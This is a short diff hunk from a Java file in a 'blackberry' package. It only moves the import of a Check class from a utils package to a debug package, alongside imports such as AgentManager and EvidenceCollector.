@@ -15,12 +15,12 @@ import blackberry.AgentManager;
 import blackberry.EventManager;
 import blackberry.Main;
 import blackberry.config.Conf;
+import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
 import blackberry.evidence.EvidenceCollector;
 import blackberry.evidence.Markup;
-import blackberry.utils.Check;
 import blackberry.utils.Utils;
 
 /**
